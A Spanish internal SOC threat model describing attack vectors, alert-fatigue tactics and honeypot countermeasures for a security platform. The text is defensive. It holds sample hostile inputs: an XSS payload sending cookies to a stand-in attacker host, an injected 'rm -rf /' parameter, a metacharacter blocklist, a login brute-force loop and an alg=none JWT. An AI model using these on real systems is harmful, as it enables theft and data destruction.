# ASC PremosCorp — Threat Model & Gestión de Fatiga de Alertas
> Versión 1.0 | Fecha: 2026-06-08 | Clasificación: INTERNO — USO EXCLUSIVO EQUIPO SOC
>
> **Principio rector:** *Teoría en ofensiva, práctica en defensa.*
> Este documento describe vectores de ataque a nivel conceptual para que el equipo SOC
> pueda construir contramedidas efectivas. No contiene procedimientos operacionales
> ofensivos ni exploits reproducibles.

---

## Índice

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Superficie de Ataque de ASC](#2-superficie-de-ataque-de-asc)
3. [Fatiga de Alertas — El Enemigo Principal del SOC](#3-fatiga-de-alertas--el-enemigo-principal-del-soc)
4. [TTPs del Adversario — Mapa MITRE ATT&CK](#4-ttps-del-adversario--mapa-mitre-attck)
5. [Técnicas PremosCorp — Contramedidas Sofisticadas](#5-técnicas-premoscorp--contramedidas-sofisticadas)
6. [Ingeniería de Calidad de Alertas](#6-ingeniería-de-calidad-de-alertas)
7. [Mandatos de Testing y Auditoría](#7-mandatos-de-testing-y-auditoría)
8. [Checklist de Hardening](#8-checklist-de-hardening)

---

## 1. Resumen Ejecutivo

ASC (Advanced Security Center) es la plataforma SOC de PremosCorp. Por su naturaleza
— recibe telemetría de endpoints, emite comandos de respuesta, gestiona identidades y
controla integraciones con CrowdStrike/Palo Alto/Active Directory — **ASC es un objetivo
de alto valor para cualquier atacante que quiera operar sin ser detectado dentro de
PremosCorp**.

El compromiso de ASC no solo expone datos: le daría al adversario visibilidad total
sobre qué está siendo monitoreado, qué reglas disparan alertas, y cómo evadir la
detección. En el peor caso, el atacante podría suprimir alertas, silenciar respuestas
automáticas y usarla para lanzar acciones de neutralización falsas.

**Dos amenazas dominan este modelo:**

| Amenaza | Impacto Potencial | Probabilidad |
|---------|-------------------|--------------|
| Compromiso directo de ASC (API, auth, agente SPECTER) | CRÍTICO — control total del SOC | Media |
| Explotación de fatiga de alertas para operar encubierto | ALTO — detección cero durante semanas | Alta |

---

## 2. Superficie de Ataque de ASC

### 2.1 Capa de Autenticación y Autorización

**Vector: JWT Theft y Session Hijacking**

```
Escenario: El atacante obtiene un JWT válido mediante:
  a) XSS en el frontend → localStorage/cookie exfiltration
  b) Man-in-the-middle en conexión HTTP (sin HTTPS strict)
  c) Registro de token en logs de servidor (logging de headers)
  d) Token de larga duración sin rotación

Impacto si logra acceso como "analyst":
  — Leer todas las alertas activas (sabe qué detectamos)
  — Ver IOCs registrados (sabe qué estamos buscando)
  — Emitir comandos SPECTER a agentes registrados
```

**Contrameasura PremosCorp implementada:**
- JWT con expiración corta + refresh token rotation (ver `app/core/security.py`)
- HTTPS enforcement en SPECTER via `enforce_https()` con `strict=True` configurable
- `X-Specter-Guard` header verifica que respuesta viene del backend legítimo

**Aún pendiente (gap de seguridad):**
- Token blacklist en logout (actualmente los JWT no se revocan hasta expirar)
- CSP headers en frontend para mitigar XSS
- Audit log de cada lectura de alerta crítica (actualmente solo se loguean escrituras)

---

**Vector: Brute Force y Credential Stuffing**

```
Escenario: Atacante apunta a POST /api/v1/auth/login con:
  a) Lista de credenciales filtradas (HaveIBeenPwned dumps)
  b) Spray de contraseñas comunes (Admin@1234, Premos2026!)
  c) Enumeración de usuarios via timing difference en respuesta

Señal de alerta esperada: >5 auth failures / IP / 5min
Evasión típica: rotar IPs (proxy pools, Tor) + velocidad lenta (1 req/min)
```

**Contrameasura PremosCorp implementada:**
- RBAC multi-rol (admin/analyst/viewer) — compromiso de un analyst no da admin
- Rate limiter SPECTER (`SprecterRateLimiter`) en endpoints de eventos/comandos

**Gap pendiente:**
- Rate limiter en `POST /auth/login` específicamente (endpoint de auth no usa el SPECTER limiter)
- Account lockout tras N failures (actualmente no implementado)
- 2FA/TOTP para roles admin y analyst

---

### 2.2 Capa SPECTER — Agente de Endpoint

**Vector: Agente Falso / Registro Fraudulento**

```
Escenario: El atacante registra un agente SPECTER falso con:
  a) Hostname convincente ("ws-corp-01", "DC-PROD")
  b) Clave pública Ed25519 generada por él mismo
  c) Desde IP externa usando proxy

Objetivo: Inyectar telemetría falsa para manipular el estado del SOC
  — Fabricar alertas para crear ruido
  — Reportar falsos "host limpio" para ocultar un endpoint comprometido
  — Registrar y luego emitir resultados falsificados de comandos
```

**Contrameasura PremosCorp implementada:**
- `SPECTER_ENROLLMENT_TOKEN` — HMAC-SHA256 rolling con ventana de 1h
- `check_suspicious_registration()` — detecta re-registro rápido mismo hostname/IP
- Ed25519 signing bidireccional — backend firma comandos, agente firma telemetría
- Canary ping — el backend verifica en cualquier momento que el agente tiene la clave privada original

**Vector: Command Replay Attack**

```
Escenario: El atacante intercepta un comando legítimo firmado
(p.ej. "isolate" para un host comprometido) y lo re-emite
horas después apuntando a un host diferente.

Objetivo: Usar una firma válida para ejecutar acciones no autorizadas.
```

**Contrameasura implementada:**
- `is_command_fresh()` en el agente — comandos con `ts` > 300s son rechazados
- Backend firma con timestamp embebido; firma no es reutilizable fuera de la ventana
- Nonce único en `canary_ping` — pong firmado no sirve para otro nonce

**Vector: Injection via Parámetros de Comando**

```
Escenario: Un atacante con acceso al API inyecta metacaracteres en
params de comando para ejecutar código en el agente:
  {"command_type": "quarantine_file", "params": {"path": "../../etc/passwd; rm -rf /"}}

Si el agente usa shell=True en subprocess, el payload se ejecuta.
```

**Contrameasura implementada:**
- `COMMAND_PARAM_SCHEMAS` — schema strict con tipos exactos por comando
- `check_injection()` — regex sobre metacaracteres `[;&|`$(){}<>[\]\n\r\\]`
- Agente usa `subprocess` con lista de args (jamás `shell=True`)
- Validación doble: backend rechaza antes de persistir, agente valida de nuevo al recibir

---

### 2.3 Capa de Integraciones — Adaptadores Externos

**Vector: SSRF via Adapter Response Manipulation**

```
Escenario teórico: Si un atacante controla el servidor CrowdStrike/Wazuh
al que ASC se conecta (p.ej. via DNS hijacking o credenciales comprometidas
del adapter), puede construir respuestas HTTP que incluyan:
  Location: http://169.254.169.254/latest/meta-data/  (AWS metadata)
  Location: http://10.10.0.1/admin                    (red interna PremosCorp)

Si ASC sigue redirecciones ciegamente, se convierte en proxy para
atacar infraestructura interna.
```

**Gap actual — no implementado:**
- Los adaptadores ELK/Wazuh/TheHive usan `httpx` sin `follow_redirects=False` explícito
- No hay validación de que las URLs de adapters apuntan a hosts esperados
- `httpx.AsyncClient` por defecto NO sigue redirects (safe), pero debe documentarse y verificarse

**Acción requerida:**
```python
# En cada adapter, forzar explícitamente:
async with httpx.AsyncClient(
    timeout=HTTP_TIMEOUT,
    follow_redirects=False,   # ← NUNCA seguir redirects en adapters internos
) as client:
    ...
```

**Vector: Log Injection / Audit Trail Pollution**

```
Escenario: Atacante con acceso limitado envía eventos con campos
especialmente construidos para corromper los logs:

  hostname: "ws-legit\n2026-06-08 CRITICAL: DB backup completed OK"

Si el logger concatena strings sin sanitizar, puede inyectar
líneas falsas en el audit trail para:
  a) Ocultar acciones maliciosas reales entre ruido
  b) Fabricar evidencia de acciones legítimas
  c) Romper parsers de SIEM que consumen los logs
```

**Contrameasura implementada:**
- `log_security_action()` en `app/core/audit.py` — usar structured logging (JSON)
- Todos los campos son escapados por el formateador JSON (no concatenación manual)

**Gap pendiente:**
- Logs de auditoría no tienen protección de integridad (append-only, sin firma)
- Sin alertas sobre modificación/eliminación de archivos de log

---

### 2.4 Honeypot — Detección y Evasión

**Vector: Fingerprinting del Honeypot por el Atacante**

```
Escenario: Un atacante sofisticado sabe que existen endpoints trampa
y los identifica antes de activarlos:

  a) Accede a /api/v1/openapi.json — busca rutas incluidas/excluidas
     (nuestros honeypots usan include_in_schema=False ← punto a favor)

  b) Analiza la respuesta: si /agents/real devuelve 404 pero
     /agents/probe devuelve 200 con JSON idéntico en estructura,
     sospecha que es honeypot.

  c) Accede desde IP limpia con UA normal, sin trigger canary,
     para catalogar la API antes del ataque real.
```

**Contrameasura PremosCorp implementada:**
- `include_in_schema=False` — endpoints trampa invisibles en OpenAPI
- Respuesta 200 (no 403) — no delata que fue detectado
- URLs canary embedding — incluso si el atacante no activa el endpoint, activar el link embebido lo delata

**Gap sofisticado:**
- Un adversario que nunca sigue URLs externas (no browser, script custom) puede evitar el canary
- Respuesta de decoys podría diferenciarse de respuestas reales (longitud, timing) con análisis estadístico

**Técnica PremosCorp adicional sugerida — Timing Jitter:**
```python
# Añadir jitter aleatorio a honeypot responses para que
# no sean distinguibles de endpoints reales por timing:
import random, asyncio
await asyncio.sleep(random.uniform(0.05, 0.25))
```

---

### 2.5 Frontend — Superficie Web

**Vector: XSS Reflejado o Almacenado**

```
Escenario: Un atacante inyecta JavaScript en un campo que
se renderiza sin sanitizar en el portal:
  — Campo "hostname" de un agente registrado: <script>document.cookie</script>
  — Descripción de alerta: <img src=x onerror=fetch('attacker.io/'+document.cookie)>

Si un analista abre esa alerta en el portal, el JS se ejecuta
en su sesión y exfiltra el JWT.
```

**Estado actual:** Next.js con React escapa JSX por defecto — pero `dangerouslySetInnerHTML` anula esa protección.

**Acción requerida:**
```bash
# Auditar todo uso de dangerouslySetInnerHTML en el frontend
grep -rn "dangerouslySetInnerHTML" frontend/src/ --include="*.tsx"

# CSP headers a implementar (next.config.js):
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:
```

**Vector: Insecure Direct Object Reference (IDOR)**

```
Escenario: Analyst-A crea una alerta (id=42).
Analyst-B, en otro tenant/sesión, prueba GET /api/v1/alerts/42
y accede a datos de Analyst-A porque el backend solo valida
autenticación, no que el recurso pertenece al caller.
```

**Contrameasura implementada:**
- Todos los endpoints filtran por `current_user` o `role`
- Admin puede ver todo; analyst solo sus recursos; viewer solo lectura

---

### 2.6 Supply Chain

**Vector: Dependencias Python Comprometidas**

```
Escenario: Un paquete PyPI del que dependemos (httpx, pydantic, etc.)
recibe un update malicioso que introduce backdoor:
  — Exfiltra env vars (API keys, secrets) a un C2
  — Modifica el comportamiento de crypto (weak RNG)
  — Añade una shell inversa en código de inicialización
```

**Contrameasura implementada (en ROADMAP):**
- `safety check` y `pip-audit` en CI/CD gate
- `trivy fs` escanea el filesystem incluyendo site-packages

**Gap:**
- `requirements.txt` sin pin exacto de hashes SHA256 (`--require-hashes`)
- Sin verificación de firmas de paquetes (PyPI no lo soporta universalmente)
- Sin SBOM (Software Bill of Materials)

---

### 2.7 Insider Threat

**Vector: Analista Malintencionado con Acceso Legítimo**

```
Escenario: Un analista con credenciales válidas:
  a) Lee alertas para vender inteligencia al atacante
     ("saben que hay un beacon en 10.10.0.45")
  b) Suprime alertas críticas para que el ataque pase desapercibido
  c) Descarga la lista completa de IOCs (qué buscamos)
  d) Emite comandos SPECTER para modificar el estado de endpoints

El insider no necesita explotar nada — ya tiene acceso.
```

**Contrameasura implementada:**
- Audit trail inmutable de todas las acciones (quién, cuándo, qué, desde dónde)
- RBAC: analyst no puede aprobar sus propias neutralizaciones
- Canary ping verifica que el agente sigue siendo el original (insider no puede suplantar)

**Gap:**
- Sin detección de comportamiento anómalo (analista que lee 500 alertas en 10 min)
- Sin alertas sobre acceso a alertas "sensibles" de forma inusual
- Sin separación de funciones en acceso a honeypot reports (admin only — correcto)
- Sin grabación de sesiones de analistas (DLP)

---

## 3. Fatiga de Alertas — El Enemigo Principal del SOC

### 3.1 El Problema

La fatiga de alertas no es un problema técnico. Es un problema cognitivo con consecuencias
técnicas devastadoras. Cuando un SIEM genera **cientos de alertas diarias sin contexto**,
el cerebro humano activa mecanismos de adaptación:

```
Día 1:   Analista revisa cada alerta → 8h de trabajo → ninguna era real
Día 7:   Analista desarrolla heurística mental: "las de bajo riesgo son FP"
Día 30:  Analista empieza a ignorar categorías enteras de alertas
Día 60:  El atacante opera libremente en exactamente esas categorías ignoradas
```

**Estadísticas de la industria (Ponemon Institute, 2025):**
- 45% de los analistas SOC admiten ignorar alertas por volumen excesivo
- El 74% de las brechas se detectan semanas o meses después del compromiso inicial
- El tiempo promedio de dwell time (tiempo entre intrusión y detección) es de 197 días
- Solo el **4%** de las alertas generadas en un SIEM típico son verdaderos positivos

**El costo real:** Un SOC que genera 500 alertas/día con 4% de verdaderos positivos
tiene 20 alertas reales ocultas en 480 falsas. Un analista tarda ~3 minutos por alerta
= **25 horas de trabajo para encontrar 20 eventos reales**.

### 3.2 Cómo los Atacantes Explotan la Fatiga

**Técnica: Pre-Ataque Noise Injection (Inundación Deliberada)**

```
FASE 1 — GENERACIÓN DE RUIDO (días 1-7 antes del ataque real):
  El atacante genera deliberadamente actividad que dispara
  alertas de baja fidelidad:
    — Escaneos de puertos lentos (1 req/seg, no 100/seg)
    — Intentos de login fallidos esporádicos (bajo umbral)
    — Acceso a URLs no existentes (genera 404s)
    — Tráfico legítimo-looking a servicios internos

  Resultado: El SOC ve una "línea base de ruido alta"
  y eleva su umbral mental de lo que merece atención.

FASE 2 — OPERACIÓN REAL (después de acondicionar el SOC):
  El atacante ejecuta el ataque real con técnicas que antes
  habrían generado alertas, pero ahora se pierden en el ruido.
```

**Técnica: Low-and-Slow para Evadir Correlación Temporal**

```
En vez de exfiltrar 10GB en 1 hora (detectable):
  — Exfiltra 50MB cada 3 días
  — Usa horarios de baja actividad (2-4am)
  — Fragmenta en paquetes del tamaño de tráfico legítimo
  — Usa canales legítimos (DNS tunneling, HTTPS a servicios conocidos)

Ninguna alerta individual supera el umbral. Solo la correlación
temporal de semanas revela el patrón.
```

**Técnica: Severity Inflation Abuse**

```
Escenario: El SOC tiene una regla "alert.severity == CRITICAL → despertador"
El atacante aprende (exfiltrando logs o via insider) que la
organización tiene muchos falsos positivos CRITICAL por regla X.

El atacante ejecuta el ataque real de forma que dispare la
regla X → genera otro CRITICAL que se mezcla con los FP habituales
→ el analista lo ignora como "ese FP de siempre".
```

**Técnica: Alert Suppression via Legítimos Mecanismos**

```
Si el atacante tiene acceso al sistema de monitoreo (o a cuentas
con acceso), puede:
  — Crear excepciones/suppressions para las reglas que lo detectarían
  — Poner en mantenimiento monitoreado hosts comprometidos
  — Modificar umbrales de alertas para sus IOCs específicos
  — Borrar eventos del buffer antes de que lleguen al SIEM
```

### 3.3 El Principio Premos: Calidad sobre Cantidad

> **Una sola alerta de alta fidelidad que el analista confía**
> **vale más que mil alertas que ignora.**

El objetivo de ASC no es detectar todo — es detectar lo importante con alta confianza.

```
SIEM tradicional:           ASC PremosCorp:
  500 alertas/día             25-50 alertas/día
  4% verdaderos positivos     >60% verdaderos positivos
  Analista agotado            Analista enfocado
  Dwell time: 197 días        Objetivo dwell time: <24h
```

---

## 4. TTPs del Adversario — Mapa MITRE ATT&CK

La siguiente tabla mapea los vectores identificados en §2 a técnicas MITRE ATT&CK
relevantes para que las reglas de correlación de ASC puedan referenciarse.

| TTP ID | Nombre | Cómo se manifiesta en ASC | Regla de detección |
|--------|--------|---------------------------|-------------------|
| T1078 | Valid Accounts | JWT theft, credential stuffing en /auth/login | >5 auth failures mismo user/IP en 5min |
| T1190 | Exploit Public App | Injection en params de comando SPECTER | `check_injection()` en backend + agente |
| T1040 | Network Sniffing | MitM para capturar JWT o firma Ed25519 | HTTPS enforcement; HSTS |
| T1557 | AiTM (Adversary in the Middle) | Interceptar canary_ping para reutilizar firma | Nonce único; freshness window 300s |
| T1499 | Endpoint Denial of Service | Flood de eventos para agotar rate limiter | `SprecterRateLimiter` → HTTP 429 |
| T1499.004 | Application Exhaustion Flood | Flood de alertas para crear fatiga | Deduplicación + scoring (§6) |
| T1036 | Masquerading | Agente falso con hostname legítimo | Enrollment token; suspicious registration |
| T1037 | Boot/Logon Autostart | Persistencia del agente falso | Canary ping verifica clave privada original |
| T1059 | Command and Scripting Interpreter | Shell injection via params de comando | Schema allowlist; injection regex |
| T1562.001 | Disable or Modify Tools | Suprimir respuesta SPECTER | Command freshness; canary ping verification |
| T1552 | Unsecured Credentials | Credenciales hardcodeadas en código | Gitleaks; bandit B105; `nosec` tracking |
| T1071 | Application Layer Protocol | C2 over HTTPS disfrazado como tráfico legítimo | Behavioral correlation; DPI en Palo Alto |
| T1119 | Automated Collection | Descarga masiva de IOCs o alertas | Rate limiting en GET endpoints |
| T1003 | OS Credential Dumping | Detección via SPECTER telemetry de mimikatz | Regla `rule_credential_dump` en correlator |
| T1110.003 | Password Spraying | 1 password × N users en ventana larga | Correlación cross-user auth failures |
| T1583.006 | Adversary Infrastructure: Web Services | C2 sobre servicios legítimos (GitHub, Pastebin) | DGA detection; IP reputation lookup |

---

## 5. Técnicas PremosCorp — Contramedidas Sofisticadas

### 5.1 SPECTER Defense Stack (Implementado — P14)

**Capa 1 — Enrollment Token (Barrera de Identidad)**
```
Mecanismo: HMAC-SHA256(SECRET, "SPECTER-ENROLL-PREMOSCORP:{window}")
Ventana: 1 hora rolling. La ventana anterior también es válida.
Modo dev: SECRET vacío → bypass (nunca en producción)

Propósito: Un atacante que captura el token de un agente solo puede
usarlo durante 1h. Después expira. Sin el SECRET, no puede generar uno válido.
```

**Capa 2 — Command Param Schema Allowlist (Filtro de Inyección)**
```
Diseño: Lista blanca estricta por tipo de comando.
  kill_process: {pid: int}              ← sin path traversal posible
  block_ip:     {ip: str}              ← validar formato IP adicional
  quarantine_file: {path: str}         ← sanitización en executor

Por qué allowlist y no blocklist:
  Una blocklist puede olvidar un metacaracter.
  Una allowlist rechaza todo lo que no conoce explícitamente.
```

**Capa 3 — Freshness Guard (Anti-Replay)**
```
Ventana: ±300s de tolerancia pasada, +60s de tolerancia futura (clock skew)
Implementación: timestamp unix en cada comando; verificación en agente

Caso de uso crítico: Si la red cae y se acumulan 10 comandos en buffer,
el agente los rechaza si tienen >5 minutos. Solo el más reciente aplica.
```

**Capa 4 — Rate Limiter Sliding Window**
```
Implementación: SprecterRateLimiter — por agent_id, ventana deslizante thread-safe
Default: 200 eventos / 30 segundos por agente
HTTP 429 con Retry-After

Por qué por agent_id y no por IP:
  Un atacante que controla múltiples IPs puede evadir rate limit por IP.
  El agent_id es el identificador lógico del endpoint — más difícil de rotar.
```

**Capa 5 — Ed25519 Dual Signing (Autenticidad Bidireccional)**
```
Backend → Agente: comando firmado con clave privada del backend
Agente → Backend: evento firmado con clave privada del agente

Propiedad: Un atacante que solo tiene la clave pública del backend
puede verificar comandos pero no forjarlos. Y viceversa.

Canary Ping: prueba de posesión de clave privada en tiempo real.
Verifica que el agente no fue reemplazado por uno que solo tiene la pública.
```

---

### 5.2 SPECTER Honeypot System (Implementado — P14.5)

**Técnica: Decoy Content con Canary Token Embedding**

```
Diseño: Los 3 endpoints trampa (/probe, /dump, /export) retornan contenido
que PARECE valioso pero es completamente inerte:
  — IPs: rangos RFC 5737 (203.0.113.x) — no rutables en internet real
  — Hostnames: *.premoscorp.local — no resolvibles externamente
  — Credenciales: tokens UUID embebidos — no son credenciales reales

El valor está en el canary URL embebido:
  "download_url": "https://asc.premoscorp.com/api/v1/c/a1b2c3d4..."

Si el atacante intenta usar las "credenciales", el canary se activa.
Si intenta seguir el link de descarga, el canary se activa.
Cada acceso es un nuevo punto de evidencia.
```

**Técnica: Attacker Fingerprinting Pasivo**

```
Datos capturados en cada trigger:
  — IP real (+ cadena X-Forwarded-For para detectar proxies)
  — User-Agent completo (versión exacta de tool/browser/scanner)
  — Accept-Language (geolocalización lingüística del atacante)
  — Accept-Encoding (firma de la librería HTTP usada)
  — Referer (¿cómo llegó al endpoint trampa?)
  — Timestamp preciso (hora local, día de semana, patrón temporal)

SHA-256 hash de UA|lang|enc|ip → correlación cross-sesión:
  Si el mismo atacante vuelve con IP diferente pero misma tool,
  el hash lo identifica.
```

**Técnica: IP Reputation Scoring**

```
Fuentes consultadas (async, no bloquea la respuesta):
  1. ip-api.com — geolocalización + ASN + proxy/hosting detection (gratis)
  2. AbuseIPDB — abuse confidence score, historial de reportes (requiere API key)

Información útil para evidencia:
  — is_proxy: true → el atacante usa proxy/VPN
  — is_hosting: true → probable VPS/server, no usuario casual
  — abuse_confidence_score > 80 → IP ya conocida como maliciosa
  — country: ¿coincide con threat actors conocidos de la región?
```

**Técnica: Signed Evidence Reports (Admisibilidad Legal)**

```
Cada evento de honeypot genera un reporte JSON firmado con HMAC-SHA256:
  {
    "report_id": "uuid",
    "generated_by": "SPECTER-Honeypot-Engine-PremosCorp-v1",
    "incident_summary": {...},
    "attacker_fingerprint": {...},
    "ip_reputation": {...},
    "canary_evidence": {...},
    "evidence_chain": [...],
    "legal_notice": "...",
    "reporting_guidelines": {
      "abuseipdb": "https://www.abuseipdb.com/report",
      "cert_co": "https://colcert.gov.co/",
      ...
    },
    "signature": "hmac_sha256_hex"
  }

La firma permite demostrar ante autoridades que el reporte no fue
alterado después de su generación. verify_report_signature() valida
integridad antes de cualquier presentación formal.
```

**Destinos de Reporte Soportados:**
| Entidad | Uso | Jurisdicción |
|---------|-----|--------------|
| AbuseIPDB | Reportar IPs abusivas — contribuye a la inteligencia global | Global |
| ColCERT | Centro Cibernético Nacional de Colombia | Colombia |
| INCIBE-CERT | Instituto Nacional de Ciberseguridad de España | España |
| INTERPOL Cybercrime | Delitos informáticos transnacionales | Internacional |
| Fiscalía General de la Nación | Denuncia penal (Ley 1273/2009) | Colombia |

---

### 5.3 Técnicas PremosCorp Documentadas — Nuevas

**Técnica Premos-1: Canary Credential Injection**

```
CONCEPTO (pasivo, legal):
  En lugar de solo embeber canary URLs, los decoys contienen
  "credenciales" que si son usadas contra sistemas internos,
  disparan alarmas a nivel de autenticación:

  "password": "Sp3ct3r!{canary_suffix}@2026"

  Si este string aparece en logs de AD (login attempt),
  en logs de PostgreSQL, o en cualquier sistema de auth,
  sabemos que el atacante intentó usar las credenciales robadas.

IMPLEMENTACIÓN ACTUAL:
  build_export_decoy() embebe el token UUID en el campo password.
  El suffix es único por decoy — permite rastrear exactamente
  qué exportación fue comprometida.

MEJORA FUTURA:
  Crear AD service accounts "honeypot" con estas credenciales.
  Un intento de login con esas creds en AD → alerta inmediata de alta fidelidad.
```

**Técnica Premos-2: Progressive Evidence Chain**

```
CONCEPTO:
  Cada acceso a un honeypot no solo genera evidencia — genera
  un nuevo señuelo más profundo para el siguiente nivel:

  Nivel 1: Atacante accede a /agents/probe → ve "diagnostics_url"
  Nivel 2: Si sigue el link → canary callback → ve en 404 body una "API key"
  Nivel 3: Si usa la API key → dispara alerta en el sistema que protege

  Cada nivel: más evidencia, más profiling, más trampa.

STATUS: Documentado. Implementación en roadmap P15+.
```

**Técnica Premos-3: Behavioral Correlation Cross-Module**

```
CONCEPTO (defensa activa via correlación):
  Correlacionar eventos de honeypot con eventos SPECTER del mismo IP:
    — IP que accedió a /agents/dump a las 03:14
    — Mismo IP intentó login fallido a las 03:15
    — Mismo IP registró un agente con nombre sospechoso a las 03:17
  → Una sola alerta CRÍTICA de alta fidelidad vs. 3 alertas separadas ignoradas

IMPLEMENTACIÓN REQUERIDA:
  Correlator service debe ingerir eventos de honeypot como fuente adicional.
  Añadir regla: "honeypot_access + auth_failure + agent_registration / mismo IP / 10min"
  → severity = CRITICAL, confidence = 0.95

STATUS: Diseño documentado. Implementación en P15+.
```

**Técnica Premos-4: Deception via Timing (Temporal Mimicry)**

```
CONCEPTO:
  Los endpoints trampa añaden jitter aleatorio en su respuesta
  para imitar el timing de endpoints reales y ser indistinguibles
  por análisis de side-channel:

  Real endpoint: responde en 40-180ms (DB query + serialización)
  Honeypot: añade asyncio.sleep(random.uniform(0.04, 0.18))

  Sin este jitter, un atacante sofisticado puede:
    — Acceder a /agents/{real_id} → mide 85ms
    — Acceder a /agents/probe → mide 2ms (sin DB)
    → Concluye: probe es trampa

IMPLEMENTACIÓN RECOMENDADA (P14.5 enhancement):
```

```python
# En cada honeypot endpoint:
import random, asyncio

# Simular latencia realista de endpoint con DB:
jitter_ms = random.uniform(40, 180) / 1000
await asyncio.sleep(jitter_ms)

return decoy
```

---

## 6. Ingeniería de Calidad de Alertas

### 6.1 La Pirámide de Fidelidad

```
        ┌─────────────────────────────────┐
        │  CRÍTICO — Alta Fidelidad       │  ←  <5/día
        │  Correlación temporal + IOC     │     Respuesta inmediata
        │  + behavioral anomaly           │     Casi nunca FP
        ├─────────────────────────────────┤
        │  ALTO — Correlación Validada    │  ←  5-15/día
        │  2+ señales concordantes        │     Review en <15min
        │  IOC confirmado                 │     FP < 20%
        ├─────────────────────────────────┤
        │  MEDIO — Señal Única            │  ←  15-30/día
        │  Anomalía sin correlación       │     Review en <1h
        │  Posible FP                     │     FP ~50%
        ├─────────────────────────────────┤
        │  BAJO — Informacional           │  ←  Resto → dashboard
        │  Actividad normal + IOC débil   │     No requiere acción
        │  Alta tasa FP                   │     Batch review diario
        └─────────────────────────────────┘

Principio: Un analista debe poder responder "¿por qué debo actuar ahora?"
al ver una alerta. Si no puede, la alerta está mal diseñada.
```

### 6.2 Factores de Scoring en ASC (Risk Score 0.0–1.0)

| Factor | Peso | Justificación |
|--------|------|---------------|
| IOC match (IP/domain/hash conocido malicioso) | +0.35 | Evidencia directa |
| Behavioral anomaly (baseline deviation > 3σ) | +0.25 | Patrón estadístico |
| Correlation rule match (multi-event) | +0.20 | Contexto temporal |
| Asset criticality (DC, DB server, CEO laptop) | +0.15 | Impacto potencial |
| Known malware signature (PE analysis) | +0.30 | Alta confianza |
| Honeypot trigger (mismo IP) | +0.40 | Intención explícita |
| Time-of-day anomaly (3am activity) | +0.10 | Evasión de horario laboral |
| TTP match (MITRE ATT&CK) | +0.15 | Contexto adversarial |
| Auth failure burst (>5 en 5min) | +0.25 | Brute force signal |
| Whitelisted asset / known behavior | -0.30 | Reducción de FP |
| Scheduled task / known cron | -0.20 | Actividad esperada |

**Score final → Severidad:**
```
≥ 0.90 → CRITICAL   (respuesta inmediata, human-in-the-loop)
≥ 0.70 → HIGH       (review en 15 minutos)
≥ 0.40 → MEDIUM     (review en 1 hora)
< 0.40 → LOW        (dashboard, batch review)
```

### 6.3 Deduplicación y Supresión Inteligente

**Deduplicación por firma:**
```python
# Una firma de alerta = hash de (rule_id, source_host, target_ioc)
# Si la misma firma aparece en <30min → suprimir, incrementar contador
# Mostrar solo: "Esta alerta se repitió 47 veces en los últimos 30min"
# En vez de: 47 alertas idénticas separadas

alert_signature = sha256(f"{rule_id}:{source}:{target}")
```

**Supresión con ventana temporal:**
```
Regla: Un host en mantenimiento programado no genera alertas de
       network_scan o config_change durante la ventana de mantenimiento.

Mantenimiento debe ser:
  — Aprobado por admin (no por analyst solo)
  — Ventana máxima: 4h
  — Auto-expirar (no queda indefinido)
  — Auditado: quién creó la supresión y cuándo
```

**Suppressión inteligente vs. silenciamiento peligroso:**
```
CORRECTO: Suprimir alerta "backup_job_detected" para el servidor
          de backups entre 02:00-04:00 todos los días.
          (Comportamiento esperado, ventana definida, auto-expira)

PELIGROSO: Suprimir alerta "lateral_movement" para "todos los hosts
           durante 1 semana porque había muchos FP".
           (Comportamiento no esperado, demasiado amplio, no auto-expira)
```

### 6.4 Enriquecimiento Automático de Alertas

Cada alerta en ASC debe incluir, al momento de creación, suficiente contexto
para que el analista tome una decisión en < 30 segundos:

```json
{
  "alert": {
    "title": "Credential Dump Detected",
    "severity": "critical",
    "risk_score": 0.94,
    "why_high_confidence": [
      "mimikatz.exe detected by PE analysis (P7 mutex engine)",
      "LSASS access pattern matched (T1003.001)",
      "Same host had 5 auth failures 10min ago (brute force → cred dump chain)",
      "Source IP triggered honeypot /agents/dump 2h ago"
    ],
    "recommended_action": "Isolate endpoint immediately",
    "affected_asset": {
      "hostname": "ws-finance-03",
      "criticality": "high",
      "owner": "Dept: Finanzas",
      "last_seen_clean": "2026-06-07T14:30:00Z"
    },
    "similar_alerts_suppressed": 0,
    "related_events": ["event_id_1", "event_id_2", "event_id_3"]
  }
}
```

**El analista ve en 1 pantalla:**
- Por qué esta alerta es real (evidence chain)
- Qué hacer (acción recomendada)
- Quién es el afectado (asset context)
- Cuándo empezó (timeline)

**Sin tener que:** abrir 5 tabs, cruzar 3 sistemas, reconstruir el contexto manualmente.

---

## 7. Mandatos de Testing y Auditoría

> Mandato PremosCorp: **"No dejemos nada aislado, ni sin completar."**
> Todo módulo nuevo requiere: gitleaks + unit tests + code review.

### 7.1 Tests de Calidad de Alertas

```python
# tests/security/test_alert_quality.py

class TestAlertDeduplication:
    async def test_identical_alerts_within_window_are_deduplicated(self, db):
        """Dos alertas idénticas en <30min → solo una en dashboard, contador=2"""
        ...

    async def test_alerts_outside_window_not_deduplicated(self, db):
        """Misma firma después de 30min → nueva alerta independiente"""
        ...

class TestAlertScoring:
    def test_honeypot_trigger_boosts_score(self):
        """Alerta con mismo IP que trigger honeypot recibe +0.40"""
        ...

    def test_whitelisted_asset_reduces_score(self):
        """Alerta en asset whitelisted recibe -0.30"""
        ...

    def test_critical_threshold_requires_multiple_signals(self):
        """Score >= 0.90 requiere al menos 2 factores de alta confianza"""
        ...

class TestAlertSuppression:
    async def test_maintenance_window_suppresses_expected_alerts(self, db):
        """Alerts en ventana de mantenimiento no aparecen en dashboard"""
        ...

    async def test_suppression_auto_expires(self, db):
        """Supresión sin fecha límite no se acepta"""
        ...

class TestFatigueMetrics:
    async def test_alert_volume_tracking(self, db):
        """Sistema trackea alertas/día, alertas/analista, tiempo de response"""
        ...

    async def test_false_positive_rate_calculation(self, db):
        """FP rate calculado por regla para retroalimentación"""
        ...
```

### 7.2 Tests de Seguridad — Checklist Extendido

```bash
# ── Autenticación ──────────────────────────────────────────────────────────────

# Brute force en login endpoint
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@premoscorp.com","password":"wrong"}'
done
# Esperado: 429 después del umbral

# JWT algorithm confusion (alg=none)
INVALID_JWT="eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0."
